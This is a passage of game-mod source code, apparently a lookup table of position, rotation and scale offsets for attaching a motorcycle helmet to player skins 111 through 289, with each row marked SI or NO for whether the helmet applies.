	{ 0.080126, 0.003028, 0.003282, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 111 || MotorcycleHelmet1 - SI
	{ 0.080126, 0.003028, 0.003282, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 112 || MotorcycleHelmet1 - SI
	{ 0.080126, 0.003028, 0.003282, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 114 || MotorcycleHelmet1 - SI
	{ 0.080126, 0.003028, 0.003282, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 115 || MotorcycleHelmet1 - SI
	{ 0.080126, 0.003028, 0.003282, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 116 || MotorcycleHelmet1 - SI
	{ 0.080126, 0.003028, 0.003282, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 117 || MotorcycleHelmet1 - SI
	{ 0.080126, 0.003028, 0.003282, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 118 || MotorcycleHelmet1 - SI
	{ 0.080126, 0.003028, 0.003282, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 119 || MotorcycleHelmet1 - NO
	{ 0.080126, 0.003028, 0.003282, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 120 || MotorcycleHelmet1 - SI
	{ 0.080126, 0.003028, 0.003282, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 121 || MotorcycleHelmet1 - SI
	{ 0.080126, 0.003028, 0.003282, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 122 || MotorcycleHelmet1 - SI
	{ 0.080126, 0.003028, 0.003282, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 123 || MotorcycleHelmet1 - SI
	{ 0.080126, 0.003028, 0.003282, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 124 || MotorcycleHelmet1 - SI
	{ 0.080126, 0.003028, 0.003282, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 125 || MotorcycleHelmet1 - SI
	{ 0.080126, 0.003028, 0.003282, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 126 || MotorcycleHelmet1 - SI
	{ 0.080126, 0.003028, 0.003282, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 127 || MotorcycleHelmet1 - SI
	{ 0.081310, 0.020286, 0.003282, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 128 || MotorcycleHelmet1 - SI
	{ 0.081310, 0.020286, 0.003282, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 129 || MotorcycleHelmet1 - SI
	{ 0.046783, 0.032432, 0.003282, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 130 || MotorcycleHelmet1 - SI
	{ 0.046783, 0.032432, 0.003282, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 131 || MotorcycleHelmet1 - SI
	{ -0.025336, 0.014666, 0.003282, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 132 || MotorcycleHelmet1 - SI
	{ 0.082529, 0.014666, 0.003282, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 133 || MotorcycleHelmet1 - SI
	{ 0.082529, 0.014666, 0.003282, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 134 || MotorcycleHelmet1 - SI
	{ 0.039577, 0.014666, 0.003282, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 135 || MotorcycleHelmet1 - SI
	{ 0.039577, 0.014666, 0.003282, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 136 || MotorcycleHelmet1 - SI
	{ 0.0, 0.014666, 0.003282, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 137 || MotorcycleHelmet1 - NO
	{ 0.049157, -0.012307, 0.003282, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 138 || MotorcycleHelmet1 - SI
	{ 0.049157, -0.012307, 0.003282, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 139 || MotorcycleHelmet1 - SI
	{ 0.068760, 0.003835, 0.003282, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 140 || MotorcycleHelmet1 - SI
	{ 0.068760, 0.003835, 0.003282, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 141 || MotorcycleHelmet1 - SI
	{ 0.068760, 0.003835, 0.003282, 0.917846, 81.798553, 77.744796, 1.186764, 1.000000, 1.000000 }, // SKINID 142 || MotorcycleHelmet1 - SI
	{ 0.068760, 0.006312, 0.003282, 0.917846, 81.798553, 77.744796, 1.442516, 1.000000, 1.000000 }, // SKINID 143 || MotorcycleHelmet1 - SI
	{ 0.068731, 0.014156, 0.000000, 78.394248, 66.939796, 0.000000, 1.145625, 1.000000, 1.196670 }, // SKINID 144 || MotorcycleHelmet1 - SI
	{ 0.068731, 0.014156, 0.000000, 78.394248, 66.939796, 0.000000, 1.145625, 1.000000, 1.196670 }, // SKINID 145 || MotorcycleHelmet1 - SI
	{ 0.068731, 0.014156, 0.000000, 78.394248, 66.939796, 0.000000, 1.145625, 1.000000, 1.196670 }, // SKINID 146 || MotorcycleHelmet1 - SI
	{ 0.029312, 0.014156, 0.000000, 78.394248, 66.939796, 0.000000, 1.145625, 1.000000, 1.196670 }, // SKINID 147 || MotorcycleHelmet1 - SI
	{ 0.029312, 0.014156, 0.000000, 78.394248, 66.939796, 11.066159, 1.145625, 1.000000, 1.196670 }, // SKINID 148 || MotorcycleHelmet1 - SI
	{ 0.0, 0.014156, 0.000000, 78.394248, 66.939796, 11.066159, 1.145625, 1.000000, 1.196670 }, // SKINID 149 || MotorcycleHelmet1 - NO
	{ 0.058838, -0.001575, 0.000000, 78.394248, 66.939796, 11.066159, 1.145625, 1.000000, 1.196670 }, // SKINID 150 || MotorcycleHelmet1 - SI
	{ 0.058838, 0.014999, 0.005790, 78.394248, 66.939796, 11.066159, 1.145625, 1.000000, 1.196670 }, // SKINID 151 || MotorcycleHelmet1 - SI
	{ 0.028017, -0.002800, 0.005790, 78.394248, 66.939796, 11.066159, 1.145625, 1.000000, 1.196670 }, // SKINID 152 || MotorcycleHelmet1 - SI
	{ 0.028017, 0.031918, 0.005790, 78.394248, 66.939796, 11.066159, 1.145625, 1.000000, 1.196670 }, // SKINID 153 || MotorcycleHelmet1 - SI
	{ 0.028017, 0.031918, 0.005790, 78.394248, 66.939796, 11.066159, 1.145625, 1.000000, 1.196670 }, // SKINID 154 || MotorcycleHelmet1 - SI
	{ 0.076935, 0.037744, 0.005790, 78.394248, 66.939796, 11.066159, 1.145625, 1.000000, 1.196670 }, // SKINID 155 || MotorcycleHelmet1 - SI
	{ 0.058837, 0.016789, 0.005790, 78.394248, 66.939796, 11.066159, 1.145625, 1.000000, 1.196670 }, // SKINID 156 || MotorcycleHelmet1 - SI
	{ 0.058837, 0.016789, 0.005790, 78.394248, 66.939796, 11.066159, 1.145625, 1.000000, 1.196670 }, // SKINID 157 || MotorcycleHelmet1 - SI
	{ 0.0, 0.016789, 0.005790, 78.394248, 66.939796, 11.066159, 1.145625, 1.000000, 1.196670 }, // SKINID 158 || MotorcycleHelmet1 - NO
	{ 0.058837, 0.028815, 0.005790, 78.394248, 66.939796, 11.066159, 1.145625, 1.000000, 1.196670 }, // SKINID 159 || MotorcycleHelmet1 - SI
	{ 0.058837, 0.028815, 0.005790, 78.394248, 66.939796, 11.066159, 1.145625, 1.000000, 1.196670 }, // SKINID 160 || MotorcycleHelmet1 - SI
	{ 0.077267, 0.002439, 0.005790, 78.394248, 66.939796, 11.066159, 1.145625, 1.000000, 1.196670 }, // SKINID 161 || MotorcycleHelmet1 - SI
	{ 0.077267, 0.002439, 0.005790, 78.394248, 66.939796, 11.066159, 1.145625, 1.000000, 1.196670 }, // SKINID 162 || MotorcycleHelmet1 - SI
	{ 0.077267, 0.002439, 0.005790, 78.394248, 66.939796, 11.066159, 1.145625, 1.000000, 1.196670 }, // SKINID 163 || MotorcycleHelmet1 - SI
	{ 0.077267, 0.002439, 0.005790, 78.394248, 66.939796, 11.066159, 1.145625, 1.000000, 1.196670 }, // SKINID 164 || MotorcycleHelmet1 - SI
	{ 0.077267, 0.002439, 0.005790, 78.394248, 66.939796, 11.066159, 1.145625, 1.000000, 1.196670 }, // SKINID 165 || MotorcycleHelmet1 - SI
	{ 0.077267, 0.002439, 0.005790, 78.394248, 66.939796, 11.066159, 1.145625, 1.000000, 1.196670 }, // SKINID 166 || MotorcycleHelmet1 - SI
	{ 0.0, 0.002439, 0.005790, 78.394248, 66.939796, 11.066159, 1.145625, 1.000000, 1.196670 }, // SKINID 167 || MotorcycleHelmet1 - NO
	{ 0.077267, 0.002439, 0.005790, 78.394248, 66.939796, 11.066159, 1.145625, 1.000000, 1.196670 }, // SKINID 168 || MotorcycleHelmet1 - SI
	{ 0.061352, -0.005744, 0.005790, 78.394248, 66.939796, 11.066159, 1.145625, 1.000000, 1.196670 }, // SKINID 169 || MotorcycleHelmet1 - SI
	{ 0.061352, -0.005744, 0.005790, 78.394248, 66.939796, 11.066159, 1.145625, 1.000000, 1.196670 }, // SKINID 170 || MotorcycleHelmet1 - SI
	{ 0.061352, -0.005744, 0.005790, 78.394248, 66.939796, 11.066159, 1.145625, 1.000000, 1.196670 }, // SKINID 171 || MotorcycleHelmet1 - SI
	{ 0.061352, -0.005744, 0.005790, 78.394248, 66.939796, 11.066159, 1.145625, 1.000000, 1.196670 }, // SKINID 172 || MotorcycleHelmet1 - SI
	{ 0.069895, 0.021228, 0.005790, 78.394248, 66.939796, 11.066159, 1.145625, 1.000000, 1.196670 }, // SKINID 173 || MotorcycleHelmet1 - SI
	{ 0.069895, 0.021228, 0.005790, 78.394248, 66.939796, 11.066159, 1.145625, 1.000000, 1.196670 }, // SKINID 174 || MotorcycleHelmet1 - SI
	{ 0.069895, 0.021228, 0.005790, 78.394248, 66.939796, 11.066159, 1.145625, 1.000000, 1.196670 }, // SKINID 175 || MotorcycleHelmet1 - SI
	{ 0.069895, 0.021228, 0.005790, 78.394248, 66.939796, 11.066159, 1.145625, 1.000000, 1.196670 }, // SKINID 176 || MotorcycleHelmet1 - SI
	{ 0.093134, 0.021228, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 177 || MotorcycleHelmet1 - SI
	{ 0.068663, 0.021228, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 178 || MotorcycleHelmet1 - SI
	{ 0.068663, 0.021228, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 179 || MotorcycleHelmet1 - SI
	{ 0.068663, 0.021228, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 180 || MotorcycleHelmet1 - SI
	{ 0.111742, 0.015187, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 181 || MotorcycleHelmet1 - SI
	{ 0.071245, 0.015187, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 182 || MotorcycleHelmet1 - SI
	{ 0.071245, 0.015187, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 183 || MotorcycleHelmet1 - SI
	{ 0.071245, 0.015187, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 184 || MotorcycleHelmet1 - SI
	{ 0.071245, 0.015187, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 185 || MotorcycleHelmet1 - SI
	{ 0.071245, 0.015187, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 186 || MotorcycleHelmet1 - SI
	{ 0.049226, 0.015187, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 187 || MotorcycleHelmet1 - SI
	{ 0.049226, 0.015187, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 188 || MotorcycleHelmet1 - SI
	{ 0.049226, 0.015187, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 189 || MotorcycleHelmet1 - SI
	{ 0.049226, 0.015187, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 190 || MotorcycleHelmet1 - SI
	{ 0.049226, 0.022189, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 191 || MotorcycleHelmet1 - SI
	{ 0.049226, 0.019496, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 192 || MotorcycleHelmet1 - SI
	{ 0.049226, 0.019496, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 193 || MotorcycleHelmet1 - SI
	{ 0.049226, 0.019496, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 194 || MotorcycleHelmet1 - SI
	{ 0.049226, 0.019496, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 195 || MotorcycleHelmet1 - SI
	{ 0.049226, 0.019496, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 196 || MotorcycleHelmet1 - SI
	{ 0.049226, 0.019496, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 197 || MotorcycleHelmet1 - SI
	{ 0.049226, 0.019496, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 198 || MotorcycleHelmet1 - SI
	{ 0.049226, 0.019496, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 199 || MotorcycleHelmet1 - SI
	{ 0.059031, 0.037007, -0.003702, 89.715873, 96.486831, 6.367833, 1.223210, 1.000000, 1.110052 }, // SKINID 200 || MotorcycleHelmet1 - SI.
	{ 0.059031, 0.037007, -0.003702, 89.715873, 96.486831, 6.367833, 1.105433, 1.000000, 1.110052 }, // SKINID 201 || MotorcycleHelmet1 - SI.
	{ 0.059031, 0.037007, -0.003702, 89.715873, 96.486831, 6.367833, 1.050121, 1.000000, 1.110052 }, // SKINID 202 || MotorcycleHelmet1 - SI.
	{ 0.059031, 0.030286, -0.003702, 89.715873, 96.486831, 6.367833, 1.050121, 1.000000, 1.110052 }, // SKINID 203 || MotorcycleHelmet1 - SI.
	{ 0.059031, 0.030286, -0.003702, 89.715873, 96.486831, 6.367833, 1.050121, 1.000000, 1.110052 }, // SKINID 204 || MotorcycleHelmet1 - SI.
	{ 0.0, 0.030286, -0.003702, 89.715873, 96.486831, 6.367833, 1.050121, 1.000000, 1.110052 }, // SKINID 205 || MotorcycleHelmet1 - NO.
	{ 0.086275, 0.030286, -0.003702, 89.715873, 96.486831, 6.367833, 1.050121, 1.000000, 1.110052 }, // SKINID 206 || MotorcycleHelmet1 - SI.
	{ 0.040006, 0.030286, -0.003702, 89.715873, 96.486831, 6.367833, 1.050121, 1.000000, 1.110052 }, // SKINID 207 || MotorcycleHelmet1 - SI.
	{ 0.065322, 0.030286, -0.003702, 89.715873, 96.486831, 6.367833, 1.050121, 1.000000, 1.110052 }, // SKINID 208 || MotorcycleHelmet1 - NO.
	{ 0.065322, 0.030286, -0.003702, 89.715873, 96.486831, 6.367833, 1.006660, 1.000000, 1.021481 }, // SKINID 209 || MotorcycleHelmet1 - SI.
	{ 0.065322, 0.030286, -0.003702, 89.715873, 96.486831, 6.367833, 1.006660, 1.000000, 1.021481 }, // SKINID 210 || MotorcycleHelmet1 - SI.
	{ 0.065322, 0.009842, -0.003702, 89.715873, 96.486831, 6.367833, 1.019046, 1.000000, 1.021481 }, // SKINID 211 || MotorcycleHelmet1 - SI.
	{ 0.065322, 0.029749, -0.003702, 89.715873, 96.486831, 6.367833, 0.909220, 1.000000, 1.021481 }, // SKINID 212 || MotorcycleHelmet1 - SI.
	{ 0.065322, 0.022352, -0.003702, 89.715873, 96.486831, 6.367833, 1.014164, 1.000000, 1.021481 }, // SKINID 213 || MotorcycleHelmet1 - SI.
	{ 0.065322, 0.006548, -0.003702, 89.715873, 96.486831, 6.367833, 1.014164, 1.000000, 1.021481 }, // SKINID 214 || MotorcycleHelmet1 - SI.
	{ 0.0, 0.006548, -0.003702, 89.715873, 96.486831, 6.367833, 1.014164, 1.000000, 1.021481 }, // SKINID 215 || MotorcycleHelmet1 - NO.
	{ 0.065322, 0.006548, -0.003702, 89.715873, 96.486831, 6.367833, 1.014164, 1.000000, 1.021481 }, // SKINID 216 || MotorcycleHelmet1 - SI.
	{ 0.065322, 0.030664, -0.003702, 89.715873, 96.486831, 6.367833, 1.014164, 1.000000, 1.021481 }, // SKINID 217 || MotorcycleHelmet1 - SI.
	{ 0.071801, 0.013245, -0.003702, 89.715873, 96.486831, 6.367833, 1.044428, 1.000000, 1.021481 }, // SKINID 218 || MotorcycleHelmet1 - SI.
	{ 0.045664, 0.013245, -0.003702, 89.715873, 96.486831, 6.367833, 1.044428, 1.000000, 1.021481 }, // SKINID 219 || MotorcycleHelmet1 - SI.
	{ 0.045664, 0.023454, -0.003702, 89.715873, 96.486831, 6.367833, 1.044428, 1.000000, 1.021481 }, // SKINID 220 || MotorcycleHelmet1 - SI.
	{ 0.063059, 0.008899, -0.003702, 89.715873, 96.486831, 6.367833, 1.105615, 1.000000, 1.021481 }, // SKINID 221 || MotorcycleHelmet1 - SI.
	{ 0.063059, 0.004834, -0.003702, 89.715873, 96.486831, 6.367833, 1.105615, 1.000000, 1.021481 }, // SKINID 222 || MotorcycleHelmet1 - SI.
	{ 0.086894, 0.025422, -0.003702, 89.715873, 96.486831, 6.367833, 1.105615, 1.000000, 1.021481 }, // SKINID 223 || MotorcycleHelmet1 - SI.
	{ 0.039299, 0.008744, -0.003702, 89.715873, 96.486831, 6.367833, 0.989521, 1.000000, 1.021481 }, // SKINID 224 || MotorcycleHelmet1 - SI.
	{ 0.042440, 0.008744, -0.003702, 89.715873, 96.486831, 6.367833, 0.989521, 1.000000, 1.021481 }, // SKINID 225 || MotorcycleHelmet1 - SI.
	{ 0.042440, 0.005189, 0.003060, 89.715873, 96.486831, 6.367833, 1.014706, 1.000000, 1.021481 }, // SKINID 226 || MotorcycleHelmet1 - SI.
	{ 0.069509, 0.028704, 0.003060, 89.715873, 96.486831, 6.367833, 1.014706, 1.000000, 1.021481 }, // SKINID 227 || MotorcycleHelmet1 - SI.
	{ 0.070585, 0.021329, 0.003060, 89.715873, 96.486831, 6.367833, 1.101840, 1.000000, 1.021481 }, // SKINID 228 || MotorcycleHelmet1 - SI.
	{ 0.058221, 0.021329, 0.003060, 89.715873, 96.486831, 6.367833, 1.012374, 1.000000, 1.021481 }, // SKINID 229 || MotorcycleHelmet1 - SI.
	{ 0.058221, 0.021329, 0.003060, 89.715873, 96.486831, 6.367833, 1.012374, 1.000000, 1.021481 }, // SKINID 230 || MotorcycleHelmet1 - SI.
	{ 0.072018, 0.021329, 0.003060, 89.715873, 96.486831, 6.367833, 1.065725, 1.000000, 1.021481 }, // SKINID 231 || MotorcycleHelmet1 - SI.
	{ 0.047198, 0.002333, 0.000000, 84.169067, 66.729423, 0.000000, 1.000000, 1.000000, 1.000000 }, // SKINID 232 || MotorcycleHelmet1 - SI.
	{ 0.059938, 0.021329, 0.003060, 89.715873, 96.486831, 6.367833, 1.065725, 1.000000, 1.021481 }, // SKINID 233 || MotorcycleHelmet1 - SI.
	{ 0.059938, 0.021329, 0.003060, 89.715873, 96.486831, 6.367833, 1.065725, 1.000000, 1.021481 }, // SKINID 234 || MotorcycleHelmet1 - SI.
	{ 0.035589, 0.021329, 0.003060, 89.715873, 96.486831, 6.367833, 1.065725, 1.000000, 1.021481 }, // SKINID 235 || MotorcycleHelmet1 - SI.
	{ 0.035589, 0.021329, 0.003060, 89.715873, 96.486831, 6.367833, 1.065725, 1.000000, 1.021481 }, // SKINID 236 || MotorcycleHelmet1 - SI.
	{ 0.035589, 0.021329, 0.003060, 89.715873, 96.486831, 6.367833, 1.065725, 1.000000, 1.021481 }, // SKINID 237 || MotorcycleHelmet1 - SI.
	{ 0.035589, 0.021329, 0.003060, 89.715873, 96.486831, 6.367833, 1.065725, 1.000000, 1.021481 }, // SKINID 238 || MotorcycleHelmet1 - SI.
	{ 0.051785, 0.021329, 0.003060, 89.715873, 96.486831, 6.367833, 1.065725, 1.000000, 1.021481 }, // SKINID 239 || MotorcycleHelmet1 - SI.
	{ 0.065339, 0.016573, 0.003060, 89.715873, 96.486831, 6.367833, 1.065725, 1.000000, 1.021481 }, // SKINID 240 || MotorcycleHelmet1 - SI.
	{ 0.0, 0.016573, 0.003060, 89.715873, 96.486831, 6.367833, 1.065725, 1.000000, 1.021481 }, // SKINID 241 || MotorcycleHelmet1 - NO.
	{ 0.0, 0.016573, 0.003060, 89.715873, 96.486831, 6.367833, 1.065725, 1.000000, 1.021481 }, // SKINID 242 || MotorcycleHelmet1 - NO.
	{ 0.065339, 0.016573, 0.003060, 89.715873, 96.486831, 6.367833, 1.065725, 1.000000, 1.021481 }, // SKINID 243 || MotorcycleHelmet1 - SI.
	{ 0.065339, 0.036559, -0.004551, 89.715873, 96.486831, 6.367833, 1.065725, 1.000000, 1.021481 }, // SKINID 244 || MotorcycleHelmet1 - SI.
	{ 0.065339, 0.016950, 0.010980, 89.715873, 96.486831, 6.367833, 1.263960, 1.000000, 1.021481 }, // SKINID 245 || MotorcycleHelmet1 - SI.
	{ 0.085716, 0.045513, 0.010980, 89.715873, 96.486831, 6.367833, 1.220781, 1.000000, 1.144201 }, // SKINID 246 || MotorcycleHelmet1 - SI.
	{ 0.085716, 0.024827, 0.010980, 89.715873, 96.486831, 6.367833, 1.220781, 1.000000, 1.144201 }, // SKINID 247 || MotorcycleHelmet1 - SI.
	{ 0.085716, 0.024827, 0.010980, 89.715873, 96.486831, 6.367833, 1.220781, 1.000000, 1.144201 }, // SKINID 248 || MotorcycleHelmet1 - SI.
	{ 0.0, 0.022424, 0.010980, 89.715873, 96.486831, 6.367833, 1.220781, 1.000000, 1.144201 }, // SKINID 249 || MotorcycleHelmet1 - NO.
	{ 0.049226, 0.019496, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 250 || MotorcycleHelmet1 - SI
	{ 0.049226, 0.019496, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 251 || MotorcycleHelmet1 - SI
	{ 0.049226, 0.019496, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 252 || MotorcycleHelmet1 - SI
	{ 0.049226, 0.019496, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 253 || MotorcycleHelmet1 - SI
	{ 0.049226, 0.019496, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 254 || MotorcycleHelmet1 - SI
	{ 0.049226, 0.019496, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 255 || MotorcycleHelmet1 - SI
	{ 0.049226, 0.019496, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 256 || MotorcycleHelmet1 - SI
	{ 0.049226, 0.019496, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 257 || MotorcycleHelmet1 - SI
	{ 0.049226, 0.019496, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 258 || MotorcycleHelmet1 - SI
	{ 0.049226, 0.019496, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 259 || MotorcycleHelmet1 - SI
	{ 0.086501, 0.030875, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 260 || MotorcycleHelmet1 - SI
	{ 0.071553, 0.008856, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 261 || MotorcycleHelmet1 - SI
	{ 0.071553, 0.008856, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 262 || MotorcycleHelmet1 - SI
	{ 0.044580, -0.002710, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 263 || MotorcycleHelmet1 - SI
	{ 0.0, -0.002710, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 264 || MotorcycleHelmet1 - NO
	{ 0.044580, -0.002710, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 265 || MotorcycleHelmet1 - SI
	{ 0.044580, -0.002710, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 266 || MotorcycleHelmet1 - SI
	{ 0.044580, -0.002710, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 267 || MotorcycleHelmet1 - SI
	{ 0.044580, -0.002710, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 268 || MotorcycleHelmet1 - SI
	{ 0.090989, 0.007476, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 269 || MotorcycleHelmet1 - SI
	{ 0.065273, 0.028286, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 270 || MotorcycleHelmet1 - SI
	{ 0.065273, 0.007428, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 271 || MotorcycleHelmet1 - SI
	{ 0.065273, 0.007428, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 272 || MotorcycleHelmet1 - SI
	{ 0.0, 0.007428, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 273 || MotorcycleHelmet1 - NO
	{ 0.065273, 0.007428, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 274 || MotorcycleHelmet1 - SI
	{ 0.065273, 0.007428, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 275 || MotorcycleHelmet1 - SI
	{ 0.065273, 0.007428, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 276 || MotorcycleHelmet1 - SI
	{ 0.0, 0.007428, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 277 || MotorcycleHelmet1 - NO
	{ 0.0, 0.007428, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 278 || MotorcycleHelmet1 - NO
	{ 0.0, 0.007428, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 279 || MotorcycleHelmet1 - NO
	{ 0.065273, 0.007428, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 280 || MotorcycleHelmet1 - SI
	{ 0.065273, 0.007428, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 281 || MotorcycleHelmet1 - SI
	{ 0.065273, 0.007428, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 282 || MotorcycleHelmet1 - SI
	{ 0.065273, 0.007428, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 283 || MotorcycleHelmet1 - SI
	{ 0.0, 0.007428, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 284 || MotorcycleHelmet1 - NO
	{ 0.065273, 0.037421, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 285 || MotorcycleHelmet1 - SI
	{ 0.065273, 0.037421, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 286 || MotorcycleHelmet1 - SI
	{ 0.0, 0.037421, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 287 || MotorcycleHelmet1 - NO
	{ 0.072866, 0.029292, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 288 || MotorcycleHelmet1 - SI
	{ 0.072866, 0.029292, 0.005790, 78.394248, 73.484039, 4.756572, 1.145625, 1.000000, 1.196670 }, // SKINID 289 || MotorcycleHelmet1 - NO
